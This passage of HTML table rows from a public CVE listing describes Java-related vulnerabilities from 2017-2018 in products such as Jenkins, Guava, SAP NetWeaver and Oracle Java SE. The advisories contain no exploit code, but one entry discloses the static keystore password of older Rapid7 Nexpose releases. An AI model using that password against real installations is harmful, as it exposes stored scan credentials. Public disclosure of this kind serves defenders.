		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-10237">CVE-2018-10237</a></td>
		<td valign="top">Unbounded memory allocation in Google Guava 11.0 through 24.x before 24.1.1 allows remote attackers to conduct denial of service attacks against servers that depend on this library and deserialize attacker-provided data, because the AtomicDoubleArray class (when serialized with Java serialization) and the CompoundOrdering class (when serialized with GWT serialization) perform eager allocation without appropriate checks on what a client has sent and whether the data size is reasonable.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-10054">CVE-2018-10054</a></td>
		<td valign="top">** DISPUTED ** H2 1.4.197, as used in Datomic before 0.9.5697 and other products, allows remote code execution because CREATE ALIAS can execute arbitrary Java code. NOTE: the vendor's position is "h2 is not designed to be run outside of a secure environment."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000997">CVE-2018-1000997</a></td>
		<td valign="top">A path traversal vulnerability exists in the Stapler web framework used by Jenkins 2.145 and earlier, LTS 2.138.1 and earlier in core/src/main/java/org/kohsuke/stapler/Facet.java, groovy/src/main/java/org/kohsuke/stapler/jelly/groovy/GroovyFacet.java, jelly/src/main/java/org/kohsuke/stapler/jelly/JellyFacet.java, jruby/src/main/java/org/kohsuke/stapler/jelly/jruby/JRubyFacet.java, jsp/src/main/java/org/kohsuke/stapler/jsp/JSPFacet.java that allows attackers to render routable objects using any view in Jenkins, exposing internal information about those objects not intended to be viewed, such as their toString() representation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000866">CVE-2018-1000866</a></td>
		<td valign="top">A sandbox bypass vulnerability exists in Pipeline: Groovy Plugin 2.59 and earlier in groovy-sandbox/src/main/java/org/kohsuke/groovy/sandbox/SandboxTransformer.java, groovy-cps/lib/src/main/java/com/cloudbees/groovy/cps/SandboxCpsTransformer.java that allows attackers with Job/Configure permission, or unauthorized attackers with SCM commit privileges and corresponding pipelines based on Jenkinsfiles set up in Jenkins, to execute arbitrary code on the Jenkins master JVM

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000865">CVE-2018-1000865</a></td>
		<td valign="top">A sandbox bypass vulnerability exists in Script Security Plugin 1.47 and earlier in groovy-sandbox/src/main/java/org/kohsuke/groovy/sandbox/SandboxTransformer.java that allows attackers with Job/Configure permission to execute arbitrary code on the Jenkins master JVM, if plugins using the Groovy sandbox are installed.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000861">CVE-2018-1000861</a></td>
		<td valign="top">A code execution vulnerability exists in the Stapler web framework used by Jenkins 2.153 and earlier, LTS 2.138.3 and earlier in stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java that allows attackers to invoke some methods on Java objects by accessing crafted URLs that were not intended to be invoked this way.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000817">CVE-2018-1000817</a></td>
		<td valign="top">Asset Pipeline Grails Plugin Asset-pipeline plugin version Prior to 2.14.1.1, 2.15.1 and 3.0.6 contains a Incorrect Access Control vulnerability in Applications deployed in Jetty that can result in Download .class files and any arbitrary file. This attack appear to be exploitable via Specially crafted GET request containing directory traversal from assets-pipeline context. This vulnerability appears to have been fixed in 2.14.1.1 (for Grails 2.x), 2.15.1 (for Grails 3 and Java 7) and 3.0.6 (for Grails 3 and Java 8).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000632">CVE-2018-1000632</a></td>
		<td valign="top">dom4j version prior to version 2.1.1 contains a CWE-91: XML Injection vulnerability in Class: Element. Methods: addElement, addAttribute that can result in an attacker tampering with XML documents through XML injection. This attack appear to be exploitable via an attacker specifying attributes or elements in the XML document. This vulnerability appears to have been fixed in 2.1.1 or later.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000616">CVE-2018-1000616</a></td>
		<td valign="top">ONOS ONOS controller version 1.13.1 and earlier contains a XML External Entity (XXE) vulnerability in onos\drivers\utilities\src\main\java\org\onosproject\drivers\utilities\XmlConfigParser.java loadxml() that can result in An adversary can remotely launch XXE attacks on ONOS controller via an OpenConfig Terminal Device.. This attack appear to be exploitable via network connectivity.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000614">CVE-2018-1000614</a></td>
		<td valign="top">ONOS ONOS Controller version 1.13.1 and earlier contains a XML External Entity (XXE) vulnerability in providers/netconf/alarm/src/main/java/org/onosproject/provider/netconf/alarm/NetconfAlarmTranslator.java that can result in An adversary can remotely launch advanced XXE attacks on ONOS controller without authentication.. This attack appear to be exploitable via crafted protocol message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000613">CVE-2018-1000613</a></td>
		<td valign="top">Legion of the Bouncy Castle Legion of the Bouncy Castle Java Cryptography APIs 1.58 up to but not including 1.60 contains a CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection') vulnerability in XMSS/XMSS^MT private key deserialization that can result in Deserializing an XMSS/XMSS^MT private key can result in the execution of unexpected code. This attack appear to be exploitable via A handcrafted private key can include references to unexpected classes which will be picked up from the class path for the executing application. This vulnerability appears to have been fixed in 1.60 and later.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000410">CVE-2018-1000410</a></td>
		<td valign="top">An information exposure vulnerability exists in Jenkins 2.145 and earlier, LTS 2.138.1 and earlier, and the Stapler framework used by these releases, in core/src/main/java/org/kohsuke/stapler/RequestImpl.java, core/src/main/java/hudson/model/Descriptor.java that allows attackers with Overall/Administer permission or access to the local file system to obtain credentials entered by users if the form submission could not be successfully processed.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000409">CVE-2018-1000409</a></td>
		<td valign="top">A session fixation vulnerability exists in Jenkins 2.145 and earlier, LTS 2.138.1 and earlier in core/src/main/java/hudson/security/HudsonPrivateSecurityRealm.java that prevented Jenkins from invalidating the existing session and creating a new one when a user signed up for a new user account.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000408">CVE-2018-1000408</a></td>
		<td valign="top">A denial of service vulnerability exists in Jenkins 2.145 and earlier, LTS 2.138.1 and earlier in core/src/main/java/hudson/security/HudsonPrivateSecurityRealm.java that allows attackers without Overall/Read permission to access a specific URL on instances using the built-in Jenkins user database security realm that results in the creation of an ephemeral user record in memory.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000407">CVE-2018-1000407</a></td>
		<td valign="top">A cross-site scripting vulnerability exists in Jenkins 2.145 and earlier, LTS 2.138.1 and earlier in core/src/main/java/hudson/model/Api.java that allows attackers to specify URLs to Jenkins that result in rendering arbitrary attacker-controlled HTML by Jenkins.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000406">CVE-2018-1000406</a></td>
		<td valign="top">A path traversal vulnerability exists in Jenkins 2.145 and earlier, LTS 2.138.1 and earlier in core/src/main/java/hudson/model/FileParameterValue.java that allows attackers with Job/Configure permission to define a file parameter with a file name outside the intended directory, resulting in an arbitrary file write on the Jenkins master when scheduling a build.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000146">CVE-2018-1000146</a></td>
		<td valign="top">An arbitrary code execution vulnerability exists in Liquibase Runner Plugin version 1.3.0 and older that allows an attacker with permission to configure jobs to load and execute arbitrary code on the Jenkins master JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000130">CVE-2018-1000130</a></td>
		<td valign="top">A JNDI Injection vulnerability exists in Jolokia agent version 1.3.7 in the proxy mode that allows a remote attacker to run arbitrary Java code on the server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-1000058">CVE-2018-1000058</a></td>
		<td valign="top">Jenkins Pipeline: Supporting APIs Plugin 2.17 and earlier have an arbitrary code execution due to incomplete sandbox protection: Methods related to Java deserialization like readResolve implemented in Pipeline scripts were not subject to sandbox protection, and could therefore execute arbitrary code. This could be exploited e.g. by regular Jenkins users with the permission to configure Pipelines in Jenkins, or by trusted committers to repositories containing Jenkinsfiles.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-0321">CVE-2018-0321</a></td>
		<td valign="top">A vulnerability in Cisco Prime Collaboration Provisioning (PCP) could allow an unauthenticated, remote attacker to access the Java Remote Method Invocation (RMI) system. The vulnerability is due to an open port in the Network Interface and Configuration Engine (NICE) service. An attacker could exploit this vulnerability by accessing the open RMI system on an affected PCP instance. An exploit could allow the attacker to perform malicious actions that affect PCP and the devices that are connected to it. This vulnerability affects Cisco Prime Collaboration Provisioning (PCP) Releases 11.6 and prior. Cisco Bug IDs: CSCvd61746.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2018-0147">CVE-2018-0147</a></td>
		<td valign="top">A vulnerability in Java deserialization used by Cisco Secure Access Control System (ACS) prior to release 5.8 patch 9 could allow an unauthenticated, remote attacker to execute arbitrary commands on an affected device. The vulnerability is due to insecure deserialization of user-supplied content by the affected software. An attacker could exploit this vulnerability by sending a crafted serialized Java object. An exploit could allow the attacker to execute arbitrary commands on the device with root privileges. Cisco Bug IDs: CSCvh25988.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-9844">CVE-2017-9844</a></td>
		<td valign="top">SAP NetWeaver 7400.12.21.30308 allows remote attackers to cause a denial of service and possibly execute arbitrary code via a crafted serialized Java object in a request to metadatauploader, aka SAP Security Note 2399804.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-9830">CVE-2017-9830</a></td>
		<td valign="top">Remote Code Execution is possible in Code42 CrashPlan 5.4.x via the org.apache.commons.ssl.rmi.DateRMI Java class, because (upon instantiation) it creates an RMI server that listens on a TCP port and deserializes objects sent by TCP clients.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-9514">CVE-2017-9514</a></td>
		<td valign="top">Bamboo before 6.0.5, 6.1.x before 6.1.4, and 6.2.x before 6.2.1 had a REST endpoint that parsed a YAML file and did not sufficiently restrict which classes could be loaded. An attacker who can log in to Bamboo as a user is able to exploit this vulnerability to execute Java code of their choice on systems that have vulnerable versions of Bamboo.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-9363">CVE-2017-9363</a></td>
		<td valign="top">Untrusted Java serialization in Soffid IAM console before 1.7.5 allows remote attackers to achieve arbitrary remote code execution via a crafted authentication request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-8913">CVE-2017-8913</a></td>
		<td valign="top">The Visual Composer VC70RUNTIME component in SAP NetWeaver AS JAVA 7.5 allows remote authenticated users to conduct XML External Entity (XXE) attacks via a crafted XML document in a request to irj/servlet/prt/portal/prtroot/com.sap.visualcomposer.BIKit.default, aka SAP Security Note 2386873.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-8046">CVE-2017-8046</a></td>
		<td valign="top">Malicious PATCH requests submitted to servers using Spring Data REST versions prior to 2.6.9 (Ingalls SR9), versions prior to 3.0.1 (Kay SR1) and Spring Boot versions prior to 1.5.9, 2.0 M6 can use specially crafted JSON data to run arbitrary Java code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-8012">CVE-2017-8012</a></td>
		<td valign="top">In EMC ViPR SRM, Storage M&amp;R, VNX M&amp;R, and M&amp;R (Watch4Net) for SAS Solution Packs, the Java Management Extensions (JMX) protocol used to communicate between components in the Alerting and/or Compliance components can be leveraged to create a denial of service (DoS) condition. Attackers with knowledge of JMX agent user credentials could potentially exploit this vulnerability to create arbitrary files on the affected system and create a DoS condition by leveraging inherent JMX protocol capabilities.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-7717">CVE-2017-7717</a></td>
		<td valign="top">SQL injection vulnerability in the getUserUddiElements method in the ES UDDI component in SAP NetWeaver AS Java 7.4 allows remote authenticated users to execute arbitrary SQL commands via unspecified vectors, aka SAP Security Note 2356504.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-7696">CVE-2017-7696</a></td>
		<td valign="top">SAP AS JAVA SSO Authentication Library 2.0 through 3.0 allow remote attackers to cause a denial of service (memory consumption) via large values in the width and height parameters to otp_logon_ui_resources/qr, aka SAP Security Note 2389042.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-7686">CVE-2017-7686</a></td>
		<td valign="top">Apache Ignite 1.0.0-RC3 to 2.0 uses an update notifier component to update the users about new project releases that include additional functionality, bug fixes and performance improvements. To do that the component communicates to an external PHP server (http://ignite.run) where it needs to send some system properties like Apache Ignite or Java version. Some of the properties might contain user sensitive information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-7345">CVE-2017-7345</a></td>
		<td valign="top">NetApp OnCommand Performance Manager and OnCommand Unified Manager for Clustered Data ONTAP before 7.1P1 improperly bind the Java Management Extension Remote Method Invocation (aka JMX RMI) service to the network, which allows remote attackers to obtain sensitive information via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-6055">CVE-2017-6055</a></td>
		<td valign="top">XML external entity (XXE) vulnerability in eParakstitajs 3 before 1.3.9 and eParaksts Java lib before 2.5.13 allows remote attackers to read arbitrary files or possibly have unspecified other impact via a crafted edoc file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-5983">CVE-2017-5983</a></td>
		<td valign="top">The JIRA Workflow Designer Plugin in Atlassian JIRA Server before 6.3.0 improperly uses an XML parser and deserializer, which allows remote attackers to execute arbitrary code, read arbitrary files, or cause a denial of service via a crafted serialized Java object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-5878">CVE-2017-5878</a></td>
		<td valign="top">The AMF unmarshallers in Red5 Media Server before 1.0.8 do not restrict the classes for which it performs deserialization, which allows remote attackers to execute arbitrary code via crafted serialized Java data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-5664">CVE-2017-5664</a></td>
		<td valign="top">The error page mechanism of the Java Servlet Specification requires that, when an error occurs and an error page is configured for the error that occurred, the original request and response are forwarded to the error page. This means that the request is presented to the error page with the original HTTP method. If the error page is a static file, expected behaviour is to serve content of the file as if processing a GET request, regardless of the actual HTTP method. The Default Servlet in Apache Tomcat 9.0.0.M1 to 9.0.0.M20, 8.5.0 to 8.5.14, 8.0.0.RC1 to 8.0.43 and 7.0.0 to 7.0.77 did not do this. Depending on the original request this could lead to unexpected and undesirable results for static error pages including, if the DefaultServlet is configured to permit writes, the replacement or removal of the custom error page. Notes for other user provided error pages: (1) Unless explicitly coded otherwise, JSPs ignore the HTTP method. JSPs used as error pages must must ensure that they handle any error dispatch as a GET request, regardless of the actual method. (2) By default, the response generated by a Servlet does depend on the HTTP method. Custom Servlets used as error pages must ensure that they handle any error dispatch as a GET request, regardless of the actual method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-5641">CVE-2017-5641</a></td>
		<td valign="top">Previous versions of Apache Flex BlazeDS (4.7.2 and earlier) did not restrict which types were allowed for AMF(X) object deserialization by default. During the deserialization process code is executed that for several known types has undesired side-effects. Other, unknown types may also exhibit such behaviors. One vector in the Java standard library exists that allows an attacker to trigger possibly further exploitable Java deserialization of untrusted data. Other known vectors in third party libraries can be used to trigger remote code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-5586">CVE-2017-5586</a></td>
		<td valign="top">OpenText Documentum D2 (formerly EMC Documentum D2) 4.x allows remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the BeanShell (bsh) and Apache Commons Collections (ACC) libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-5372">CVE-2017-5372</a></td>
		<td valign="top">The function msp (aka MSPRuntimeInterface) in the P4 SERVERCORE component in SAP AS JAVA allows remote attackers to obtain sensitive system information by leveraging a missing authorization check for the (1) getInformation, (2) getParameters, (3) getServiceInfo, (4) getStatistic, or (5) getClientStatistic function, aka SAP Security Note 2331908.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-5344">CVE-2017-5344</a></td>
		<td valign="top">An issue was discovered in dotCMS through 3.6.1. The findChildrenByFilter() function which is called by the web accessible path /categoriesServlet performs string interpolation and direct SQL query execution. SQL quote escaping and a keyword blacklist were implemented in a new class, SQLUtil (main/java/com/dotmarketing/common/util/SQLUtil.java), as part of the remediation of CVE-2016-8902; however, these can be overcome in the case of the q and inode parameters to the /categoriesServlet path. Overcoming these controls permits a number of blind boolean SQL injection vectors in either parameter. The /categoriesServlet web path can be accessed remotely and without authentication in a default dotCMS deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-5230">CVE-2017-5230</a></td>
		<td valign="top">The Java keystore in all versions and editions of Rapid7 Nexpose prior to 6.4.50 is encrypted with a static password of 'r@p1d7k3y5t0r3' which is not modifiable by the user. The keystore provides storage for saved scan credentials in an otherwise secure location on disk.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-5189">CVE-2017-5189</a></td>
		<td valign="top">NetIQ iManager before 3.0.3 delivered a SSL private key in a Java application (JAR file) for authentication to Sentinel, allowing attackers to extract and establish their own connections to the Sentinel appliance.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-4926">CVE-2017-4926</a></td>
		<td valign="top">VMware vCenter Server (6.5 prior to 6.5 U1) contains a vulnerability that may allow for stored cross-site scripting (XSS). An attacker with VC user privileges can inject malicious java-scripts which will get executed when other VC users access the page.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3902">CVE-2017-3902</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the Web user interface (UI) in Intel Security ePO 5.1.3, 5.1.2, 5.1.1, and 5.1.0 allows authenticated users to inject malicious Java scripts via bypassing input validation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3626">CVE-2017-3626</a></td>
		<td valign="top">Vulnerability in the Oracle GlassFish Server component of Oracle Fusion Middleware (subcomponent: Java Server Faces). The supported version that is affected is 3.1.2. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle GlassFish Server. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle GlassFish Server accessible data. CVSS 3.0 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3544">CVE-2017-3544</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 6u141, 7u131 and 8u121; Java SE Embedded: 8u121; JRockit: R28.3.13. Difficult to exploit vulnerability allows unauthenticated attacker with network access via SMTP to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded, JRockit accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3539">CVE-2017-3539</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 6u141, 7u131 and 8u121; Java SE Embedded: 8u121. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.1 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3533">CVE-2017-3533</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 6u141, 7u131 and 8u121; Java SE Embedded: 8u121; JRockit: R28.3.13. Difficult to exploit vulnerability allows unauthenticated attacker with network access via FTP to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded, JRockit accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3526">CVE-2017-3526</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JAXP). Supported versions that are affected are Java SE: 6u141, 7u131 and 8u121; Java SE Embedded: 8u121; JRockit: R28.3.13. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.9 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3514">CVE-2017-3514</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: AWT). Supported versions that are affected are Java SE: 6u141, 7u131 and 8u121. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3512">CVE-2017-3512</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: AWT). Supported versions that are affected are Java SE: 7u131 and 8u121. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3511">CVE-2017-3511</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JCE). Supported versions that are affected are Java SE: 7u131 and 8u121; Java SE Embedded: 8u121; JRockit: R28.3.13. Difficult to exploit vulnerability allows unauthenticated attacker with logon to the infrastructure where Java SE, Java SE Embedded, JRockit executes to compromise Java SE, Java SE Embedded, JRockit. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, JRockit, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 7.7 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3509">CVE-2017-3509</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 6u141, 7u131 and 8u121; Java SE Embedded: 8u121. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data as well as unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 4.2 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3289">CVE-2017-3289</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Hotspot). Supported versions that are affected are Java SE: 7u121 and 8u112; Java SE Embedded: 8u111. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS v3.0 Base Score 9.6 (Confidentiality, Integrity and 